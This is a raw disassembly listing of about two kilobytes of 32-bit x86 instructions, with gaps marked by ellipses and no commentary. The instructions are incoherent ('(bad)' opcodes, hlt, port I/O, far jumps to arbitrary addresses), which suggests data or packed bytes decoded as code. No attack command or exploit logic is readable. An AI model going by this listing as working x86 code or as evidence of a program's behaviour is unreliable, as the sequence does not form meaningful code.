  41fc11:	aam    0xe0
  41fc13:	mov    ebx,eax
  41fc15:	jmp    0x41fbcc
  41fc17:	adc    al,0x31
  41fc19:	dec    eax
  41fc1a:	mov    al,ds:0xd8d11f33
  41fc1f:	add    al,0x8
  41fc21:	xor    eax,0x244590b3
  41fc26:	inc    esp
  41fc27:	xor    DWORD PTR [esi+0x2],edx
  41fc2a:	xchg   edx,eax
  41fc2b:	sbb    eax,0x257ee22f
  41fc30:	and    DWORD PTR [ebx+0x79],eax
  41fc33:	mov    al,0x94
  41fc35:	cmp    al,0xa0
  41fc37:	mov    esp,DWORD PTR [edi]
  41fc39:	cmc    
  41fc3a:	fcom   DWORD PTR [eax-0x40]
  41fc3d:	sbb    al,BYTE PTR [edi]
  41fc3f:	test   BYTE PTR ds:0xb0a188d1,dl
  41fc45:	jge    0x41fc2d
  41fc47:	mov    es,WORD PTR fs:[edx+0x5a088ad4]
  41fc4e:	call   0x996dbcf4
  41fc53:	clc    
  41fc54:	in     eax,dx
  41fc55:	jno    0x41fc8c
  41fc57:	aas    
  41fc58:	xchg   edi,eax
  41fc59:	sbb    BYTE PTR [ebx+edi*4-0x1],cl
  41fc5d:	push   es
  41fc5e:	xchg   edi,eax
  41fc5f:	mov    ds:0xe4db28bd,al
  41fc64:	mov    ds:0x70375ec6,eax
  41fc69:	add    dl,ch
  41fc6b:	int    0x41
  41fc6d:	iret   
  41fc6e:	bound  edx,QWORD PTR [ecx-0x3815fc5e]
  41fc74:	add    ah,cl
  41fc76:	fwait
  41fc77:	repz mov edx,0x503499ff
  41fc7d:	and    eax,0xd17dba12
  41fc82:	scas   eax,DWORD PTR es:[edi]
  41fc83:	(bad)
  41fc86:	jnp    0x41fca5
  41fc88:	gs push cs
  41fc8a:	mov    ah,0x58
  41fc8c:	hlt    
  41fc8d:	jmp    0xc193:0xfaf756f6
  41fc94:	push   edx
  41fc95:	test   BYTE PTR [eax],cl
  41fc97:	ret    
  41fc98:	xchg   edx,eax
  41fc99:	push   edi
  41fc9a:	mov    ecx,0x47da5615
  41fc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca0:	mov    dh,0x55
  41fca2:	aaa    
  41fca3:	dec    ecx
  41fca4:	repnz or BYTE PTR [eax],ch
  41fca7:	jnp    0x41fc33
  41fca9:	sub    al,0xf6
  41fcab:	int    0xcf
  41fcad:	idiv   DWORD PTR [ebp+0x20]
  41fcb0:	enter  0x872f,0x5e
  41fcb4:	lods   al,BYTE PTR ds:[esi]
  41fcb5:	and    DWORD PTR [ebp+0x2e],esi
  41fcb8:	and    ch,BYTE PTR [eax]
  41fcba:	adc    ebp,DWORD PTR [ebx]
  41fcbc:	ja     0x41fcb4
  41fcbe:	mov    ecx,0x5ad925c4
  41fcc3:	inc    edx
  41fcc4:	sub    ch,BYTE PTR [eax+0x43]
  41fcc7:	in     eax,0x2e
  41fcc9:	popf   
  41fcca:	mov    al,0x79
  41fccc:	jb     0x41fd0a
  41fcce:	retf   0xf2dd
  41fcd1:	xchg   esp,eax
  41fcd2:	lods   al,BYTE PTR ds:[esi]
  41fcd3:	popf   
  41fcd4:	cmp    BYTE PTR [ecx+0x6e],bl
  41fcd7:	scas   al,BYTE PTR es:[edi]
  41fcd8:	test   DWORD PTR ds:0x4f2691e4,edx
  41fcde:	adc    esp,DWORD PTR [ebx-0x23]
  41fce1:	pop    ecx
  41fce2:	or     al,0xec
  41fce4:	stos   DWORD PTR es:[edi],eax
  41fce5:	test   DWORD PTR [edi+0x3d],eax
  41fce8:	ret    0x81c4
  41fceb:	rcl    BYTE PTR [eax],0xd5
  41fcee:	test   DWORD PTR [ebx],ebx
  41fcf0:	cmp    eax,0xc320882e
  41fcf5:	inc    esi
  41fcf6:	aaa    
  41fcf7:	fwait
  41fcf8:	mov    edi,0x2e3476c5
  41fcfd:	xchg   edi,eax
  41fcfe:	sub    BYTE PTR [ecx+0x35],ah
  41fd01:	dec    esi
  41fd02:	xchg   esp,eax
  41fd03:	out    dx,al
  41fd04:	cmp    BYTE PTR [edi+0x4ae25a76],dh
  41fd0a:	mov    esi,ebx
  41fd0c:	push   ebx
  41fd0d:	mov    ebp,0xfa31
	...
  41fd72:	add    BYTE PTR [eax],al
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	push   ebx
  41fd81:	pushf  
  41fd82:	or     al,0x90
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	les    ebp,FWORD PTR [ebx+0x0]
  41fd8f:	popa   
  41fd90:	jge    0x41fd7a
  41fd92:	jmp    0x524a:0xb92ea3ca
  41fd99:	jmp    0x3a19:0xba868b5d
  41fda0:	rol    DWORD PTR [eax-0x6ed18b4c],cl
  41fda6:	push   eax
  41fda7:	push   edx
  41fda8:	in     al,0xd1
  41fdaa:	inc    edx
  41fdab:	test   al,0x2b
  41fdad:	test   cl,0xc3
  41fdb0:	ins    BYTE PTR es:[edi],dx
  41fdb1:	test   edi,esi
  41fdb3:	fst    QWORD PTR [edi+edi*1-0x7566534a]
  41fdba:	and    DWORD PTR [esi-0x2ec052cf],eax
  41fdc0:	jge    0x41fd7d
  41fdc2:	push   ss
  41fdc3:	in     eax,dx
  41fdc4:	xlat   BYTE PTR ds:[ebx]
  41fdc5:	idiv   BYTE PTR [ebx+ebx*8-0x1e278d8f]
  41fdcc:	clc    
  41fdcd:	les    ebx,FWORD PTR [edx-0x4b998707]
  41fdd3:	nop
  41fdd4:	shl    bl,cl
  41fdd6:	mov    ebx,0xd1983fa0
  41fddb:	jp     0x41fdfe
  41fddd:	retf   0x347
  41fde0:	push   edi
  41fde1:	clc    
  41fde2:	or     bl,BYTE PTR [esi+0x21]
  41fde5:	sti    
  41fde6:	sub    al,0x55
  41fde8:	in     eax,dx
  41fde9:	popa   
  41fdea:	lds    eax,FWORD PTR [ebp+0x64]
  41fded:	fmul   DWORD PTR ds:0x1022537e
  41fdf3:	pop    ebx
  41fdf4:	and    esi,DWORD PTR [edi-0x1b]
  41fdf7:	xor    BYTE PTR [ebp+esi*1+0xd],0xcf
  41fdfc:	mul    ebx
  41fdfe:	xor    bh,BYTE PTR [edi-0x61]
  41fe01:	add    bh,al
  41fe03:	ret    
  41fe04:	or     eax,esp
  41fe06:	dec    eax
  41fe07:	adc    al,0x9e
  41fe09:	test   BYTE PTR gs:[ebp-0x4a],cl
  41fe0d:	pop    esp
  41fe0e:	add    edx,DWORD PTR [edx+ecx*1+0x5c]
  41fe12:	cmc    
  41fe13:	push   edi
  41fe14:	push   ds
  41fe15:	rcr    ebx,cl
  41fe17:	jmp    0x9c65:0xc40a10d0
  41fe1e:	dec    eax
  41fe1f:	push   0x6a
  41fe21:	mov    ds:0x1de3d374,eax
  41fe26:	jb     0x41fe7d
  41fe28:	les    edx,FWORD PTR [ecx+0x31]
  41fe2b:	int3   
  41fe2c:	mov    esi,0x8644d1fc
  41fe31:	cmp    eax,0x67e4cd04
  41fe36:	hlt    
  41fe37:	adc    DWORD PTR [ebx],edi
  41fe39:	jp     0x41fdf5
  41fe3b:	dec    esp
  41fe3c:	bsf    ebx,edi
  41fe3f:	xor    al,0x71
  41fe41:	cmp    DWORD PTR [eax],ecx
  41fe43:	cmp    al,0xa5
  41fe45:	lahf   
  41fe46:	mov    edi,0xe88bdd7
  41fe4b:	jecxz  0x41fdcf
  41fe4d:	xor    bl,dh
  41fe4f:	cs dec esp
  41fe51:	jnp    0x41fe09
  41fe53:	pop    ecx
  41fe54:	pushf  
  41fe55:	imul   edx,DWORD PTR [ecx],0x96681429
  41fe5b:	jmp    0x8801b669
  41fe60:	inc    edx
  41fe61:	popf   
  41fe62:	fisub  WORD PTR [edi+edx*8]
  41fe65:	jl     0x41fdfb
  41fe67:	inc    esp
  41fe68:	test   DWORD PTR [ecx-0x26],edi
  41fe6b:	clc    
  41fe6c:	icebp  
  41fe6d:	(bad)  [ebx]
  41fe6f:	leave  
  41fe70:	ss jbe 0x41fe87
  41fe73:	and    edx,DWORD PTR [edx]
  41fe75:	dec    ebp
  41fe76:	or     BYTE PTR [edx+0x39b2a139],al
  41fe7c:	add    edx,edi
  41fe7e:	aas    
  41fe7f:	fldenv [esi+0x16d44541]
  41fe85:	or     eax,0xfd64824
  41fe8a:	push   cs
  41fe8b:	xor    eax,0xe77268b7
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x8a
  41ff01:	icebp  
  41ff02:	and    eax,0x153dc1c
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	aaa    
  41ff0d:	or     dh,ah
  41ff0f:	xor    dl,BYTE PTR [ebp-0x2]
  41ff12:	call   0x726f:0x7b735e56
  41ff19:	jbe    0x41fef7
  41ff1b:	inc    edx
  41ff1c:	enter  0x6fd9,0xc8
  41ff20:	shr    al,1
  41ff22:	daa    
  41ff23:	loopne 0x41fead
  41ff25:	int    0x3a
  41ff27:	adc    al,0xea
  41ff29:	mov    bh,0x9a
  41ff2b:	data16 stos BYTE PTR es:[edi],al
  41ff2d:	inc    edx
  41ff2e:	xchg   ecx,eax
  41ff2f:	xchg   BYTE PTR [ecx+0x61],dh
  41ff32:	mov    edi,0x9fa378c9
  41ff37:	or     dl,bl
  41ff39:	aas    
  41ff3a:	pop    es
  41ff3b:	and    al,0x39
  41ff3d:	inc    ebp
  41ff3e:	retf   
  41ff3f:	xlat   BYTE PTR ds:[ebx]
  41ff40:	jle    0x41ffc1
  41ff42:	push   0xb2cfeba0
  41ff47:	xchg   ebp,eax
  41ff48:	sub    al,0xe6
  41ff4a:	ss daa 
  41ff4c:	sub    DWORD PTR [ebx-0x28],ebx
  41ff4f:	adc    al,0xcb
  41ff51:	pop    edi
  41ff52:	mov    bh,0xf7
  41ff54:	std    
  41ff55:	rcr    esi,1
  41ff57:	int    0x15
  41ff59:	mov    ebp,0x8450ec58
  41ff5e:	hlt    
  41ff5f:	hlt    
  41ff60:	pop    ds
  41ff61:	into   
  41ff62:	popa   
  41ff63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff64:	cli    
  41ff65:	out    0x49,al
  41ff67:	inc    edi
  41ff68:	mov    DWORD PTR [edi+0x6f],eax
  41ff6b:	pushf  
  41ff6c:	test   al,0x38
  41ff6e:	test   BYTE PTR [edi+eiz*4-0x39],cl
  41ff72:	mov    esp,0x9a4b22e1
  41ff77:	fsubr  st,st(3)
  41ff79:	into   
  41ff7a:	lods   al,BYTE PTR ds:[esi]
  41ff7b:	cwde   
  41ff7c:	hlt    
  41ff7d:	mov    ecx,0xba4a557d
  41ff82:	mov    DWORD PTR [eax-0x5d],esi
  41ff85:	sub    eax,0x939a794d
  41ff8a:	je     0x41ff91
  41ff8c:	add    ah,BYTE PTR [edx]
  41ff8e:	(bad)  
  41ff8f:	retf   
  41ff90:	cmp    al,0xc2
  41ff92:	inc    ebp
  41ff93:	push   eax
  41ff94:	jge    0x41ff70
  41ff96:	fwait
  41ff97:	pushf  
  41ff98:	xor    DWORD PTR [eax-0x71],edi
  41ff9b:	inc    ebx
  41ff9c:	sbb    esp,DWORD PTR [edx+0x33]
  41ff9f:	inc    ebx
  41ffa0:	sbb    ah,BYTE PTR [edi-0x5a79e347]
  41ffa6:	gs cmp eax,0x47a8d067
  41ffac:	pop    esp
  41ffad:	jns    0x420008
  41ffaf:	out    0x53,al
  41ffb1:	and    esi,DWORD PTR [ecx]
  41ffb3:	repnz or edx,0xfffffff1
  41ffb7:	ss ds push ecx
  41ffba:	int3   
  41ffbb:	cmc    
  41ffbc:	add    DWORD PTR [eax+0xe],eax
  41ffbf:	add    al,0x10
  41ffc1:	cmp    bh,BYTE PTR [ecx-0x2b1f8267]
  41ffc7:	and    eax,0x86c312cd
  41ffcc:	sbb    DWORD PTR [esi+0x49],esi
  41ffcf:	xchg   edi,eax
  41ffd0:	cli    
  41ffd1:	ret    0x4346
  41ffd4:	mov    dl,0xf6
  41ffd6:	xchg   edx,esi
  41ffd8:	xchg   DWORD PTR [edx+0x518f5757],ecx
  41ffde:	shl    BYTE PTR [ecx+0x4a],cl
  41ffe1:	mul    ah
  41ffe3:	push   0x65b1cc9e
  41ffe8:	and    BYTE PTR [ecx-0x20d81b71],dl
  41ffee:	mov    esi,0xfd68fd80
  41fff3:	inc    BYTE PTR [edx+0x7b]
  41fff6:	mov    edi,0xb1449d8c
  41fffb:	outs   dx,BYTE PTR ds:[esi]
  41fffc:	and    DWORD PTR [edx-0x7541e970],eax
  420002:	push   es
  420003:	pop    edi
  420004:	inc    esi
  420005:	jmp    DWORD PTR [ebp-0x69af9a70]
  42000b:	inc    esp
  42000c:	sbb    eax,0xd0af98
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffd8
  420081:	imul   ah
  420083:	xor    eax,esp
  420085:	push   esp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	adc    dh,bl
  42008e:	call   0x54154118
  420093:	popa   
  420094:	sbb    eax,0xe5b82503
  420099:	(bad)  
  42009a:	(bad)  
  42009b:	out    0x24,al
  42009d:	mov    ebx,0xd6a4e309
  4200a2:	sbb    DWORD PTR [edi+ecx*2],edx
  4200a5:	add    eax,DWORD PTR [esi+0x29]
  4200a8:	(bad)  
  4200a9:	stc    
  4200aa:	sub    BYTE PTR [edx-0x77],ah
  4200ad:	and    esp,esp
  4200af:	cs cmp al,0xb5
  4200b2:	xchg   edi,ebx
  4200b4:	mov    eax,0x9721ea93
  4200b9:	mov    esp,0x8334c802
  4200be:	push   esp
  4200bf:	fld    QWORD PTR [ecx-0x5a]
  4200c2:	dec    ecx
  4200c3:	fdivp  st(4),st
  4200c5:	fwait
  4200c6:	cld    
  4200c7:	test   al,0x49
  4200c9:	mov    esi,?
  4200cb:	push   eax
  4200cc:	dec    edx
  4200cd:	inc    edx
  4200ce:	or     dl,BYTE PTR [ebp+0x60]
  4200d1:	dec    ebx
  4200d2:	call   0x1781:0xfa2a6419
  4200d9:	int    0xcf
  4200db:	push   edx
  4200dc:	inc    eax
  4200dd:	into   
  4200de:	or     al,0xa3
  4200e0:	jmp    0x703eff6d
  4200e5:	or     DWORD PTR [edx-0x3db44b2e],edx
  4200eb:	inc    ebx
  4200ec:	mov    eax,ds:0x29c3d241
  4200f1:	bound  ecx,QWORD PTR [edx-0x6831cf50]
  4200f7:	(bad)  
  4200f8:	mov    edi,0x41cb467a
  4200fd:	hlt    
  4200fe:	push   esp
  4200ff:	test   eax,0x58539908
  420104:	retf   0xa136
  420107:	das    
  420108:	in     eax,0x53
  42010a:	jne    0x42014e
  42010c:	outs   dx,DWORD PTR ds:[esi]
  42010d:	xchg   ebx,eax
  42010e:	cdq    
  42010f:	das    
  420110:	aas    
  420111:	iret   
  420112:	sahf   
  420113:	imul   eax,ebp,0x753085d6
  420119:	arpl   WORD PTR ds:0x6f1983e7,sp
  42011f:	mov    dh,0xd6
  420121:	and    al,0x2f
  420123:	mov    ds:0xa866a171,al
  420128:	shl    BYTE PTR [edx-0x157c91a0],0xd
  42012f:	jae    0x4200e9
  420131:	xor    eax,DWORD PTR [ebx-0x576e6176]
  420137:	fcmovbe st,st(2)
  420139:	sbb    ebp,DWORD PTR gs:[edx]
  42013c:	scas   eax,DWORD PTR es:[edi]
  42013d:	jo     0x420117
  42013f:	iret   
  420140:	inc    ebp
  420141:	dec    esp
  420142:	imul   ebx,ecx,0xffffffef
  420145:	test   BYTE PTR [ebx+0x6979f0c1],ah
  42014b:	arpl   WORD PTR [esi],bp
  42014d:	int    0xbf
  42014f:	loopne 0x4200d9
  420151:	imul   ecx,DWORD PTR [edx+eax*4+0x30d01158],0x6f6cfb14
  42015c:	ret    
  42015d:	cmp    DWORD PTR [edx-0x1f],esi
  420160:	pop    ss
  420161:	or     ebp,DWORD PTR [edi+edx*1-0xc4c5135]
  420168:	jmp    0x420125
  42016a:	push   ecx
  42016b:	sahf   
  42016c:	adc    edx,DWORD PTR [edi+eax*8]
  42016f:	addr16 dec edx
  420171:	jae    0x420149
  420173:	xchg   edi,eax
  420174:	loope  0x4201b4
  420176:	and    ebp,edi
  420178:	and    DWORD PTR [eax+0x3d],ebp
  42017b:	stos   DWORD PTR es:[edi],eax
  42017c:	mov    eax,0xa6f62dc
  420181:	ja     0x420196
  420183:	call   0x28640c4d
  420188:	sar    BYTE PTR [edx-0x30],1
  42018b:	jmp    0x511ae52
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x6c728c0e],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	mov    al,ds:0x8acafb73
  420211:	sub    eax,0x3ef61e9e
  420216:	into   
  420217:	xchg   esp,eax
  420218:	sub    BYTE PTR [edi-0x4a],0x22
  42021c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42021d:	idiv   BYTE PTR [ebx-0x4c]
  420220:	pop    esp
  420221:	or     DWORD PTR [esi],0x7d
  420224:	repnz add dl,ah
  420227:	scas   eax,DWORD PTR es:[edi]
  420228:	mov    esi,0x9f43bf49
  42022d:	icebp  
  42022e:	leave  
  42022f:	test   al,0x73
  420231:	ret    0x855a
  420234:	jmp    0x420250
  420236:	mov    BYTE PTR [esi-0x741f52ca],cl
  42023c:	aaa    
  42023d:	fadd   QWORD PTR [ebp-0x34]
  420240:	stc    
  420241:	leave  
  420242:	fistp  QWORD PTR [esi]
  420244:	js     0x420234
  420246:	out    dx,al
  420247:	pop    esi
  420248:	push   esi
  420249:	repnz or edi,DWORD PTR [eax]
  42024c:	push   eax
  42024d:	xor    eax,0x6f212be3
  420252:	lods   al,BYTE PTR ds:[esi]
  420253:	retf   0x7b5c
  420256:	pop    eax
  420257:	mov    ebx,0x4720ed8a
  42025c:	idiv   BYTE PTR [ecx]
  42025e:	inc    BYTE PTR [ebp-0x40]
  420261:	imul   BYTE PTR [eax]
  420263:	(bad)  
  420264:	xor    bl,bh
  420266:	hlt    
  420267:	pusha  
  420268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420269:	xor    eax,0x904901d
  42026e:	adc    al,0x85
  420270:	dec    esp
  420271:	mov    ebx,0x9b3e5493
  420276:	das    
  420277:	(bad)  
  420278:	loop   0x4202b2
  42027a:	xor    BYTE PTR [eax+0x3a01e44b],0x92
  420281:	inc    edi
  420282:	inc    eax
  420283:	push   ecx
  420284:	out    0x56,eax
  420286:	imul   edx,DWORD PTR [esp+eax*1+0x2d],0x6eaa0240
  42028e:	jmp    0x588adb98
  420293:	cs stos BYTE PTR es:[edi],al
  420295:	mov    DWORD PTR [ebx+0x2f],edx
  420298:	pop    ebp
  420299:	sahf   
  42029a:	jecxz  0x4202cc
  42029c:	(bad)  
  42029d:	pop    ebp
  42029e:	xor    BYTE PTR [esi],ch
  4202a0:	lods   eax,DWORD PTR ds:[esi]
  4202a1:	test   BYTE PTR [esi],dh
  4202a3:	dec    ebp
  4202a4:	sub    BYTE PTR [edi+0x3d],ch
  4202a7:	mov    eax,ds:0x54f3bcc9
  4202ac:	imul   ebx,DWORD PTR [ebp-0x5d],0x63
  4202b0:	aas    
  4202b1:	cmp    DWORD PTR [ecx-0x71],edx
  4202b4:	add    DWORD PTR [esi-0x3d],esp
  4202b7:	and    edx,edi
  4202b9:	dec    edi
  4202ba:	sub    al,0x6b
  4202bc:	mov    ds:0xbb03195,al
  4202c1:	sti    
  4202c2:	aas    
  4202c3:	inc    ecx
  4202c4:	je     0x4202e5
  4202c6:	ror    DWORD PTR [ecx+0x13b3b91e],0x97
  4202cd:	popa   
  4202ce:	adc    esp,DWORD PTR [edi+ecx*8+0x18ffd33b]
  4202d5:	gs pop eax
  4202d7:	outs   dx,DWORD PTR ds:[esi]
  4202d8:	sbb    ah,BYTE PTR [edx-0x45]
  4202db:	mov    dl,0xbd
  4202dd:	lods   al,BYTE PTR ds:[esi]
  4202de:	in     al,0x6c
  4202e0:	mov    dh,0x87
  4202e2:	in     eax,dx
  4202e3:	jnp    0x4202ef
  4202e5:	in     eax,dx
  4202e6:	cli    
  4202e7:	pop    esi
  4202e8:	xchg   ebp,eax
  4202e9:	ss popa 
  4202eb:	inc    ebp
  4202ec:	mov    al,0x9d
  4202ee:	push   0x3e
  4202f0:	cmc    
  4202f1:	inc    ecx
  4202f2:	sub    al,0xfb
  4202f4:	lahf   
  4202f5:	popa   
  4202f6:	jne    0x4202ca
  4202f8:	inc    ebp
  4202f9:	(bad)  
  4202fa:	push   ecx
  4202fb:	xchg   dh,ch
  4202fd:	jne    0x420288
  4202ff:	pop    esi
  420300:	xchg   edx,eax
  420301:	loop   0x42028d
  420303:	dec    eax
  420304:	inc    ecx
  420305:	fimul  WORD PTR [esi+0x217494f1]
  42030b:	cvttps2pi mm3,QWORD PTR [ebp+0xffe5]
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	fnstsw WORD PTR [edi-0x70]
  420383:	mov    esi,0x156e8
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	aaa    
  42038d:	out    0xcd,al
  42038f:	push   cs
  420390:	aas    
  420391:	loopne 0x420336
  420393:	mov    ds:0x277f80c1,eax
  420398:	dec    eax
  420399:	xlat   BYTE PTR ds:[ebx]
  42039a:	xchg   ecx,eax
  42039b:	inc    edi
  42039c:	test   BYTE PTR ds:0x6659de42,bh
  4203a2:	sub    bh,BYTE PTR [ecx+0xc]
  4203a5:	or     BYTE PTR [ebx],al
  4203a7:	inc    ecx
  4203a8:	xchg   edx,eax
  4203a9:	add    al,0x7e
  4203ab:	retf   0x4a0
  4203ae:	(bad)  
  4203af:	(bad)  
  4203b0:	dec    edx
  4203b1:	dec    ebp
  4203b2:	inc    edi
  4203b3:	sahf   
  4203b4:	and    eax,0xc7011978
  4203b9:	rcl    DWORD PTR [edi-0x30aafae7],cl
  4203bf:	fcomip st,st(0)
  4203c1:	hlt    
  4203c2:	xor    BYTE PTR [ecx+0x17],ah
  4203c5:	fisub  DWORD PTR [ebx+0x7d3131d2]
  4203cb:	push   ecx
  4203cc:	add    cl,ch
  4203ce:	pop    esi
  4203cf:	lea    edx,[edx]
  4203d1:	ins    BYTE PTR es:[edi],dx
  4203d2:	dec    edi
  4203d3:	mov    DWORD PTR [eax+0x2a],ecx
  4203d6:	fcomp  DWORD PTR [ebx+0x6e]
  4203d9:	int3   
  4203da:	(bad)  
  4203db:	(bad)  
  4203dc:	clc    
  4203dd:	sbb    al,0x9
  4203df:	mov    ebp,0x2218f1f9
  4203e4:	rol    WORD PTR [ebp-0x4556bfb1],1
  4203eb:	jle    0x42040b
  4203ed:	mov    esi,0x8b15bf34
  4203f2:	in     eax,0x98
  4203f4:	adc    BYTE PTR [esi],ah
  4203f6:	ja     0x4203ac
  4203f8:	idiv   bh
  4203fa:	mul    bl
  4203fc:	test   al,0x70
  4203fe:	or     BYTE PTR [ecx+0x16],dl
  420401:	pop    edx
  420402:	mov    cl,0xb8
  420404:	dec    edx
  420405:	mov    esi,0xf374f63a
  42040a:	imul   ebp,edi,0x72d0ac28
  420410:	aaa    
  420411:	jne    0x42047c
  420413:	lea    ecx,[eax]
  420415:	sbb    ebp,DWORD PTR [ecx]
  420417:	mov    bh,ch
  420419:	sub    eax,0xedc4503
  42041e:	pop    ds
  42041f:	jne    0x4203b3
  420421:	stos   DWORD PTR es:[edi],eax
  420422:	jnp    0x420412
  420424:	popa   
  420425:	imul   ebp,DWORD PTR [edx+0x4a],0xc3fe96ba
  42042c:	sub    BYTE PTR [eax-0x53ce483e],ch
  420432:	push   ds
  420433:	jo     0x420470
  420435:	mov    bh,0xc3
  420437:	xlat   BYTE PTR ds:[ebx]
  420438:	les    edx,FWORD PTR [ebx-0x35]
  42043b:	mov    dh,0x7d
  42043d:	fyl2xp1 
  42043f:	inc    edx
  420440:	test   BYTE PTR [ebx-0x7a],al
  420443:	adc    BYTE PTR [edx-0x46],bl
  420446:	outs   dx,DWORD PTR ds:[esi]
  420447:	push   edi
  420448:	mov    dl,0x2b
  42044a:	push   es
  42044b:	mov    edx,0x9f170cc
  420450:	adc    cl,BYTE PTR [ebp+0x74]
  420453:	imul   esp,DWORD PTR ds:0x6e5fed84,0x284f62ed
  42045d:	mov    esp,ebx
  42045f:	addr16 (bad) 
  420461:	mov    esi,0x7d726e91
  420466:	jnp    0x4204dc
  420468:	jns    0x42049a
  42046a:	invd   
  42046c:	lahf   
  42046d:	mov    edx,0xe9b753a7
  420472:	or     al,0x56
  420474:	sub    eax,DWORD PTR [edx+0x4f3b1d5]
  42047a:	adc    DWORD PTR [esi],0x23
  42047d:	adc    edx,DWORD PTR [ebp+0x27]
  420480:	cmp    bh,BYTE PTR [esi+0x4f]
  420483:	int    0xea
  420485:	mov    cl,0xdb
  420487:	fdivr  st(0),st
  420489:	repnz xor esi,DWORD PTR [edx]
  42048c:	call   0x7dee26
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	xchg   ebp,eax
  420501:	pop    ecx
  420502:	pop    edx
  420503:	test   eax,0x157ec
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	add    cl,BYTE PTR [ebx+ebx*8+0x0]
  420510:	int    0x5d
  420512:	add    al,0xeb
  420514:	pushf  
  420515:	cwde   
  420516:	lods   eax,DWORD PTR ds:[esi]
  420517:	lds    edi,FWORD PTR [edx+0x25b12b0f]
  42051d:	push   esi
  42051e:	push   ebp
  42051f:	out    dx,al
  420520:	xor    DWORD PTR [ecx],ebx
  420522:	fidiv  WORD PTR [esi-0xcde40d5]
  420528:	adc    eax,0xbc60d3b0
  42052d:	pop    eax
  42052e:	or     ebp,edx
  420530:	add    ah,ah
  420532:	popa   
  420533:	xchg   ebx,eax
  420534:	cmp    dh,al
  420536:	test   DWORD PTR [ebx-0x43],esi
  420539:	clc    
  42053a:	aas    
  42053b:	xor    DWORD PTR [edx+0x42],0xffffffc8
  42053f:	cmp    al,0xa3
  420541:	push   esi
  420542:	aad    0x7e
  420544:	in     al,dx
  420545:	pushf  
  420546:	adc    ebx,edx
  420548:	inc    edx
  420549:	pop    esi
  42054a:	pop    eax
  42054b:	or     edi,DWORD PTR [esi]
  42054d:	pop    ecx
  42054e:	pop    ebp
  42054f:	inc    ebp
  420550:	inc    ebp
  420551:	mov    WORD PTR [ebx+0x1d447954],gs
  420557:	lahf   
  420558:	ret    0x4003
  42055b:	mov    WORD PTR [ecx],ds
  42055d:	push   ebx
  42055e:	mov    DWORD PTR [esi-0x2c6814d0],ebx
  420564:	dec    ebp
  420565:	sahf   
  420566:	dec    esi
  420567:	ret    
  420568:	and    BYTE PTR [edx-0x7c],dh
  42056b:	add    esp,ecx
  42056d:	loope  0x420548
  42056f:	push   esp
  420570:	inc    eax
  420571:	scas   eax,DWORD PTR es:[edi]
  420572:	(bad)  
  420573:	pushf  
  420574:	jmp    0xb1973e4b
  420579:	and    ecx,DWORD PTR [edi-0x575ee927]
  42057f:	bound  ebp,QWORD PTR ss:0xce767ea2
  420586:	push   ss
  420587:	div    BYTE PTR [edi]
  420589:	mov    WORD PTR [eax+ebp*8],gs
  42058c:	mov    ch,0x40
  42058e:	xchg   esi,eax
  42058f:	pop    ebp
  420590:	mov    al,0xbe
  420592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420593:	jmp    0xe1c9:0x19242e90
  42059a:	push   ecx
  42059b:	fld    DWORD PTR [eax+ecx*2+0x9]
  42059f:	add    dl,BYTE PTR [ecx-0x14]
  4205a2:	out    dx,al
  4205a3:	and    ebp,esi
  4205a5:	leave  
  4205a6:	out    dx,eax
  4205a7:	pop    esp
  4205a8:	cmp    al,0xe6
  4205aa:	pop    esp
  4205ab:	ds sti 
  4205ad:	adc    eax,0x1bea5eb
  4205b2:	lea    edx,[ecx-0x2f]
  4205b5:	add    DWORD PTR [edx-0x1cdb8438],esi
  4205bb:	(bad)  
  4205bc:	fcom   QWORD PTR [esi]
  4205be:	xlat   BYTE PTR ds:[ebx]
  4205bf:	xchg   ebp,eax
  4205c0:	sbb    eax,0xe58c4e1e
  4205c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205c6:	xchg   ebp,eax
  4205c7:	pushf  
  4205c8:	mov    dl,0x67
  4205ca:	push   es
  4205cb:	mov    edx,DWORD PTR [esi+0x48703ead]
  4205d1:	mov    ecx,0xfa3dd196
  4205d6:	add    BYTE PTR [ecx],ah
  4205d8:	dec    esp
  4205d9:	rcl    DWORD PTR [edx],cl
  4205db:	xchg   ebp,eax
  4205dc:	aam    0x43
  4205de:	mov    dh,0x46
  4205e0:	(bad)  
